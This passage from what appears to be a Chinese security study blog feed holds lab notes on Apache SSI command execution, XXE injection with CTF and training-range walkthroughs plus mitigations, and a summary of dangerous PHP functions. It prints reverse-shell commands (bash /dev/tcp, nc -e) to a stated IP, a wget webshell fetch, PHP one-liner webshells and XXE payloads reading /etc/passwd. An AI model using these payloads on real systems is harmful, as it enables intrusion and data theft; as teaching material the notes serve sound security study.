rel="noopener">https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/ssi-rce</a></p><p><strong>影响版本</strong>：Apache全版本（支持SSI与CGI）</p><p><strong>影响说明</strong>：绕过服务器策略，上传webshell</p><p><strong>环境说明</strong>：PHP7.1 、 Apache2.4.25</p><p><strong>环境搭建</strong>：<br>此次环境使用docker环境搭建，环境采用地址<a href="https://link.zhihu.com/?target=https%3A//github.com/zhangzhenfeng/vulhub/tree/master/httpd/ssi-rce">Vulhub</a>，环境文件有2个</p><ul><li>docker-compose.yml</li><li>upload.php</li></ul><p>执行构建环境命令如下（启动后在浏览器中访问<a href="https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8080">http://127.0.0.1:8080</a>）</p><pre class=" language-text"><code class="language-text">docker-compose builddocker-compose up -d</code></pre><p><strong>漏洞原理</strong><br>SSI（server-side includes）:是放置在HTML页面中的指令，它可以将动态生成的内容添加到现有的HTML页面，而不必通过CGI程序或其他动态技术来提供整个页面。以上是定义采用在Apache官网对<a href="https://link.zhihu.com/?target=https%3A//httpd.apache.org/docs/2.4/howto/ssi.html">SSI的定义</a>，说白了就是可以在HTML中加入特定的指令，也可以引入其他的页面。开启SSI需要单独配置Apache，可以参考<a href="https://link.zhihu.com/?target=https%3A//httpd.apache.org/docs/2.4/howto/ssi.html">SSI配置</a>。<br>SSI可以完成查看时间、文件修改时间、CGI程序执行结果、执行系统命令、连接数据库等操作，功能非常强大。<br>我们要利用的就是SSI执行系统命令的功能，正常的一个包含SSI指令的文件，可以如下内容：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--#exec cmd="whoami" --></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span></span></code></pre><p>文件名保存为test.shtml，这个后缀取决于Apache的配置，默认是此后缀。<br>当后台对扩展名校验不严格时，可以上传此类型文件，达到执行命令，获取webshell的目的。执行效果：</p><p><img src="https://pic1.zhimg.com/80/v2-ebadded85bd12ddb13481a3cf4d86d80_720w.jpg" alt="img"></p><p>上传webshell：</p><pre class=" language-text"><code class="language-text"><!--#exec cmd="wget http://xxx/shell.txt | rename shell.txt shell.php" -->echo '<?php @eval($_POST[margin]);?>' > shell.php</code></pre><p>反弹shell：</p><pre class=" language-text"><code class="language-text"><!--#exec cmd="/bin/bash -i > /dev/tcp/192.168.0.118/8888 0<&1 2>&1" --><!--#exec cmd="nc x.x.x.x 8888 -e /bin/bash"--></code></pre><h5 id="漏洞复现：-1"><a href="#漏洞复现：-1" class="headerlink" title="漏洞复现："></a>漏洞复现：</h5><p>正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件：</p><p><a href="https://github.com/zhangzhenfeng/vulhub/blob/master/httpd/ssi-rce/1.png" target="_blank" rel="noopener"><img src="https://github.com/zhangzhenfeng/vulhub/raw/master/httpd/ssi-rce/1.png" alt="img"></a></p><p>成功上传，然后访问shell.shtml，可见命令已成功执行：</p><p><a href="https://github.com/zhangzhenfeng/vulhub/blob/master/httpd/ssi-rce/2.png" target="_blank" rel="noopener"><img src="https://github.com/zhangzhenfeng/vulhub/raw/master/httpd/ssi-rce/2.png" alt="img"></a></p><h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://zhuanlan.zhihu.com/p/125115734" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/125115734</a></p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apache中间件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞学习</title>
      <link href="/2020/04/02/xxe-lou-dong-xue-xi/"/>
      <url>/2020/04/02/xxe-lou-dong-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="XXE漏洞学习笔记-靶场实战"><a href="#XXE漏洞学习笔记-靶场实战" class="headerlink" title="XXE漏洞学习笔记+靶场实战"></a>XXE漏洞学习笔记+靶场实战</h2><p>这里推荐一篇全面介绍XXE漏洞的文章：<a href="https://xz.aliyun.com/t/3357#toc-23" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-23</a></p><h4 id="一、关于XML和XXE的基础知识"><a href="#一、关于XML和XXE的基础知识" class="headerlink" title="一、关于XML和XXE的基础知识"></a>一、关于XML和XXE的基础知识</h4><p>​     XXE全称XML,也就是XML外部实体注入攻击，是对非安全的外部实体数据进行处理时引发的安全问题。要想搞懂XXE，一定要先了解XML语法规则和外部实体的定义及调用形式。</p><h5 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h5><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素。XML语法规则：</p><p>1.所有的XML元素都必须有一个关闭标签；</p><p>2.XML标签对大小写敏感。</p><p>3.XML必须正确嵌套。</p><p>4.XML属性值必须加“”。</p><ul><li>XML被设计为传输和存储数据，其焦点是数据的内容。</li><li>HTML被设计用来显示数据，其焦点是数据的外观。</li></ul><p><strong>XML基本文档结构</strong></p><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--XML声明--></span><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token comment" spellcheck="true">&lt;!--DTD，这部分可选的--></span>          <span class="token doctype">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY ></span>&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><span class="token comment" spellcheck="true">&lt;!--文档元素--></span>                                                                          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span></code></pre><h5 id="xml元素介绍"><a href="#xml元素介绍" class="headerlink" title="xml元素介绍"></a>xml元素介绍</h5><p>XML元素是指从开始标签直到结束标签的部分。每个元素又有对应的属性，XML属性必须加引号。</p><p>注意：</p><ul><li><p>XML文档必须有一个根元素。</p></li><li><p>XML元素必须有一个关闭标签</p></li><li><p>XML标签对大小写敏感</p></li><li><p>XML元素必须被正确的嵌套。</p></li><li><p>XML属性值必须加引号</p></li></ul><p><img src="QQ%E6%88%AA%E5%9B%BE20200117181423.png" alt=""></p><h5 id="XML-DTD介绍"><a href="#XML-DTD介绍" class="headerlink" title="XML DTD介绍"></a>XML DTD介绍</h5><p>DTD文档类型定义，约束了xml文档的结构。拥有正确语法的XML被称为“形式良好”的XML，通过DTD验证约束XML是“合法”的XML。</p><img src="QQ截图20200117183256.png" style="zoom: 67%;" /><h5 id="DTD含义"><a href="#DTD含义" class="headerlink" title="DTD含义"></a>DTD含义</h5><p>XML文档有自己的一个格式规范，这个格式规范是由一个叫做DTD文档类型定义的东西控制的。</p><p>DTD用来描述xml文档的结构，一个DTD文档包含：</p><ul><li>元素的定义规则</li><li>元素之间的关系规则</li><li>属性的定义规则</li></ul><p>DTD可被成行地声明于xml文档中，也可作为一个外部引用。</p><h5 id="内部的DOCTYPE声明"><a href="#内部的DOCTYPE声明" class="headerlink" title="内部的DOCTYPE声明"></a>内部的DOCTYPE声明</h5><p>内部声明DTD类型声明：<!DOCTYPE 根元素 [子元素声明]></p><img src="QQ截图20200117195250.png" style="zoom:67%;" /><h5 id="引用外部实体："><a href="#引用外部实体：" class="headerlink" title="引用外部实体："></a>引用外部实体：</h5><p>我们主要关注XML外部实体的定义和调用方式：</p><!ENTITY 实体名称 SYSTEM "URL"><p> </p><p><strong>实例：</strong></p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE root-element SYSTEM "test.dtd"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>you<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>are<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>very<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>good!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span></code></pre><p>test.dtd</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMNET</span> <span class="token attr-name">from</span> <span class="token attr-name">(#PCDATA</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">head</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span></code></pre><p>- PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。</p><h5 id="DTD实体介绍"><a href="#DTD实体介绍" class="headerlink" title="DTD实体介绍"></a>DTD实体介绍</h5><p>实体定义：实体是用于定义引用普通文本或者特殊字符的快捷方式的变量。</p><p>在DTD中的实体类型，一般分为：内部实体和外部实体，细分又分为一般实体和参数实体。除外部参数实体引用以字符（%）开始外，其他参数实体都以字符(&amp;)开始，以字符(;)结束。</p><h5 id="内部实体："><a href="#内部实体：" class="headerlink" title="内部实体："></a>内部实体：</h5><!ENTITY 实体名称 ”实体的值"><p><img src="QQ%E6%88%AA%E5%9B%BE20200117200803.png" alt=""></p><h5 id="外部实体："><a href="#外部实体：" class="headerlink" title="外部实体："></a>外部实体：</h5><!ENTITY 实体名称 SYSTEM "URl/URL"><img src="QQ截图20200117201148.png"  /><h5 id="外部参数实体："><a href="#外部参数实体：" class="headerlink" title="外部参数实体："></a>外部参数实体：</h5><!ENTITY % 实体名 “实体内容"><p>该类型的实体用“%”字符声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容：</p><p><strong>示例：</strong></p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype">&lt;!DOCTYPE demo [            &lt;!ENTITY % first "Hello"></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">second</span> <span class="token attr-name">"&amp;first;_world"</span><span class="token punctuation">></span></span>%second;]></code></pre><p>​                                </p><h4 id="XML注入漏洞（XXE漏洞）"><a href="#XML注入漏洞（XXE漏洞）" class="headerlink" title="XML注入漏洞（XXE漏洞）"></a>XML注入漏洞（XXE漏洞）</h4><h5 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h5><p>XXE漏洞全称XML外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的XML文件进行过滤，导致可以上传恶意的XML文件。</p><p>通常攻击者会将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。</p><h5 id="常见的XXE漏洞类型"><a href="#常见的XXE漏洞类型" class="headerlink" title="常见的XXE漏洞类型"></a>常见的XXE漏洞类型</h5><ul><li><strong>基础的XXE注入</strong>——外部实体注入本地DTD</li><li><strong>基于盲注的XXE注入</strong>——xml解析器在响应中不显示任何错误。、</li><li><strong>基于错误的XXE注入</strong>——成功解析之后，XML解析器始终显示SAME响应。（您的消息已被接收）。因此，我们可能希望解析器将文件的内容“打印”到错误响应中。</li></ul><h5 id="XXE漏洞危害"><a href="#XXE漏洞危害" class="headerlink" title="XXE漏洞危害"></a>XXE漏洞危害</h5><ul><li>任意文件读取</li><li>探测内网地址</li><li>通过DTD窃取文件</li><li>远程代码执行</li></ul><h5 id="XXE漏洞的测试方法"><a href="#XXE漏洞的测试方法" class="headerlink" title="XXE漏洞的测试方法"></a>XXE漏洞的测试方法</h5><p>发现post请求的接口的时候，可以这样试试：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY test &quot;THIS IS A STRING!&quot;&gt; ]&gt; &lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</code></pre><p>如果发现了一个错误：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE a [&lt;!ENTITY test &quot;nice string bro&quot;&gt;] &gt;&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</code></pre><p>说明能够解析，试试读文件：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;] &gt;&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</code></pre><p>或者用php伪协议：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE a [&lt;!ENTITY test SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;] &gt;&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</code></pre><p>得到的结国再base64解码即可。</p><h5 id="XXE漏洞的防御"><a href="#XXE漏洞的防御" class="headerlink" title="XXE漏洞的防御"></a>XXE漏洞的防御</h5><p>方案：使用开发语言提供的禁用外部实体的方法。</p><p><strong>1.PHP</strong>：</p><p>libxml_disable_entity_loader(true);</p><p><strong>2.JAVA:</strong></p><p>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</p><p>dbf.setExpandEntityReferences(false);</p><p><strong>3.Python：</strong></p><p>from lxml import etree</p><p>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p><h3 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h3><h4 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h4><h5 id="pikachu靶场简介"><a href="#pikachu靶场简介" class="headerlink" title="pikachu靶场简介"></a>pikachu靶场简介</h5><p>​     Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。</p><h5 id="XXE漏洞利用进行文件读取"><a href="#XXE漏洞利用进行文件读取" class="headerlink" title="XXE漏洞利用进行文件读取"></a>XXE漏洞利用进行文件读取</h5><p>我们首先在本地进入网站，选择XXE模块</p><img src="QQ截图20200123165140.png" style="zoom: 50%;" /><p>构造利用payload</p><img src="QQ截图20200123170052.png" style="zoom:67%;" /><p>将payload填入输入框进行提交</p><img src="QQ截图20200123165827.png" style="zoom:50%;" /><p>可见我们提交的内容显现在了页面。</p><p>我们在D盘下新建一个1.txt文件，内容为：</p><img src="QQ截图20200123170613.png" style="zoom: 80%;" /><p>然后构造利用代码：</p><img src="QQ截图20200123171804.png" style="zoom:80%;" /><p>提交，我们可以成功读取到本地1.txt文件的内容</p><img src="QQ截图20200123170601.png" style="zoom: 67%;" /><h4 id="CTF-jarvisoj-xxe"><a href="#CTF-jarvisoj-xxe" class="headerlink" title="CTF-jarvisoj(xxe)"></a>CTF-jarvisoj(xxe)</h4><p>我们进入题目，发现有一个输出框</p><img src="QQ截图20200202185412.png" style="zoom: 80%;" /><p>我们输入任意内容然后进行抓包</p><img src="QQ截图20200202185424.png" style="zoom: 80%;" /><p>将Content-Type的值改为application/xml，然后提交xml发现能够被解析</p><p>我们构造payload读取目标机器/home/ctf/flag.txt中的flag值。</p><pre><code>&lt;!DOCTYPE foo [    &lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;]&gt;&lt;root&gt;    &lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><img src="QQ截图20200202185528.png" style="zoom:67%;" /><p>可以看到成功读取。</p><h4 id="BWAPP-（XXE部分）"><a href="#BWAPP-（XXE部分）" class="headerlink" title="BWAPP （XXE部分）"></a>BWAPP （XXE部分）</h4><p>我们先点击黑体字获取XXE攻击脚本。</p><img src="QQ截图20200128170206.png" style="zoom:67%;" /><p><img src="QQ%E6%88%AA%E5%9B%BE20200128170255.png" alt=""></p><p>然后使用Burp抓包后发送到Repeater模块</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128171953.png" alt=""></p><p><strong>第一次我们使用http协议读取robots.txt文件内容</strong></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128175808.png" alt=""></p><p><strong>第二次我们使用php协议读取 xml页面中的内容</strong></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128175940.png" alt=""></p><p><strong>第三次我们使用file协议读取本机的/etc/passwd的内容</strong></p><img src="QQ截图20200128180043.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> web漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP危险函数总结</title>
      <link href="/2020/04/02/php-wei-xian-han-shu-zong-jie/"/>
      <url>/2020/04/02/php-wei-xian-han-shu-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="php危险函数总结"><a href="#php危险函数总结" class="headerlink" title="php危险函数总结"></a>php危险函数总结</h2><h4 id="什么是危险函数"><a href="#什么是危险函数" class="headerlink" title="什么是危险函数"></a>什么是危险函数</h4><p>​    函数设计出来就是让人使用的，之所以危险，是因为其功能过于强大。开发人员特别是刚从业的人员很少很少会完整阅读整个文档，再或者是没有意识到当给这些函数传递一些非常规的，外部可控的参数会带来什么影响。</p><pre><code>$_GET            $POST$_fILES$_COOKIE$_REQUEST        $_SERVER        $_SESSION    </code></pre><h4 id="执行任意代码的函数"><a href="#执行任意代码的函数" class="headerlink" title="执行任意代码的函数"></a>执行任意代码的函数</h4><ul><li>eval函数</li><li>assert函数</li><li>create_function 函数</li><li>preg_replace 函数</li><li>call_user_func/call_user_func_array函数</li><li>array_map函数</li><li>array_filter函数</li><li>usort/uasort函数</li><li>$a($b)动态函数</li></ul><h5 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h5><p>eval() 函数把字符串按照 PHP 代码来计算。</p><p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p><p><strong>注释：</strong>return 语句会立即终止对字符串的计算。</p><p><strong>提示：</strong>该函数对于在数据库文本字段中供日后计算而进行的代码存储很有用。</p><pre><code>&lt;?php$string = &quot;beautiful&quot;;$time = &quot;winter&quot;;$str = &#39;This is a $string $time morning!&#39;;eval(&quot;\$str = \&quot;$str\&quot;;&quot;);echo $str;输出为：This is a beautiful winter morning! </code></pre><p><strong>简单的一句话木马：</strong><?php eval($_POST['CMD']);?></p><h5 id="assert函数"><a href="#assert函数" class="headerlink" title="assert函数"></a>assert函数</h5><p>assert——检测一个 断言是否为FALSE</p><p>如果参数为字符串，它将会被assert()当做php代码来执行</p><p>版本只能为：5.x</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">function</span> fo<span class="token punctuation">{</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php phpinfo() ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"$func()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>如果我们提交?func=fo，即可写入shell.php</p><h5 id="create-function函数"><a href="#create-function函数" class="headerlink" title="create_function函数"></a>create_function函数</h5><p>create_function(string $args, string $code)</p><p>适用范围：<code>PHP 4&gt; = 4.0.1</code>，<code>PHP 5</code>，<code>PHP 7</code></p><p>功能：根据传递的参数创建匿名函数，并为其返回唯一名称。</p><pre><code>&lt;?php$id=$_GET[&#39;id&#39;];$str2=&#39;echo&#39;.$a.&#39;&quot;test&quot;&#39;.$id.&quot;;&quot;;$f1 = create_function(&#39;$a&#39;, $str2);$f1(&quot;abc&quot;);?&gt;</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200218123543.png" alt=""></p><h5 id="preg-replace函数"><a href="#preg-replace函数" class="headerlink" title="preg_replace函数"></a>preg_replace函数</h5><p>preg_replace($pattern,$replacement,$subject,$limit,$count)</p><p>示例1：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/test/e"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"this is a test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>当我们所要匹配的字符串中含有test时</p><p>我们直接传入参数？a=phpinfo()即可执行代码。</p><p>示例2：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/\s*\[php\](.+?)\[\/php\]\s*/ies"</span><span class="token punctuation">,</span> <span class="token string">'test("\1")'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"h"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200218125837.png" alt=""></p><h5 id="call-user-func-call-user-func-array函数"><a href="#call-user-func-call-user-func-array函数" class="headerlink" title="call_user_func/call_user_func_array函数"></a>call_user_func/call_user_func_array函数</h5><p>call_user_func($callback,$parameter)</p><p>调用一个回调函数处理字符串,</p><p>call_user_func_array($callback,$param arr)</p><p>利用回调函数处理数组。</p><p><strong>示例1：</strong></p><img src=QQ截图20200218130741.png /><img src="QQ截图20200218130753.png" style="zoom:67%;" /><p><strong>示例2：</strong></p><p>一句话木马：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>@<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200218131820.png" alt=""></p><h5 id="array-map函数"><a href="#array-map函数" class="headerlink" title="array_map函数"></a>array_map函数</h5><p>array_map（$callback,$array1)</p><p>​    作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre> <img src="QQ截图20200218133234.png"  /><h5 id="array-filter函数"><a href="#array-filter函数" class="headerlink" title="array_filter函数"></a>array_filter函数</h5><p>array_filter() 函数用回调函数过滤数组中的元素。</p><p>该函数把输入数组中的每个键值传给回调函数。如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组。数组键名保持不变。</p><p>语法：array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><img src="QQ截图20200218202542.png" style="zoom:67%;" /><h5 id="usort-uasort函数"><a href="#usort-uasort函数" class="headerlink" title="usort/uasort函数"></a>usort/uasort函数</h5><p><strong>usort</strong></p><p>使用用户自定义的比较函数对数组中的值进行排序 </p><p>usort(array, cmp_function)；</p><p>uasort(array, cmp_function)；</p><h5 id="a-b动态函数"><a href="#a-b动态函数" class="headerlink" title="$a$b动态函数"></a>$a$b动态函数</h5><h4 id="读取网络资源的函数"><a href="#读取网络资源的函数" class="headerlink" title="读取网络资源的函数"></a>读取网络资源的函数</h4><p>常见的php读取远程文件的方式</p><ul><li><p><strong>Fopen()</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$handle</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.baidu.com","rb");</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$contents</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">,</span> <span class="token number">8192</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$contents</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre></li></ul><ul><li><strong>file_get_content()</strong></li></ul><ul><li><strong>curl</strong></li></ul><h4 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h4><h5 id="system函数"><a href="#system函数" class="headerlink" title="system函数"></a>system函数</h5><p>system():执行外部程序，并且返回输出</p><h5 id="shell-exec-没有回显的命令执行"><a href="#shell-exec-没有回显的命令执行" class="headerlink" title="shell_exec(没有回显的命令执行)"></a>shell_exec(没有回显的命令执行)</h5><p>shell_exec():通过shell环境，并且将完整的输出以字符串方式返回</p><h5 id="passthru函数"><a href="#passthru函数" class="headerlink" title="passthru函数"></a>passthru函数</h5><p>执行外部程序并且显示原始输出</p><h5 id="exec函数"><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h5><p>​    exec():执行一个外部程序 </p><h5 id="ob-start函数"><a href="#ob-start函数" class="headerlink" title="ob_start函数"></a>ob_start函数</h5><h4 id="操作文件的函数"><a href="#操作文件的函数" class="headerlink" 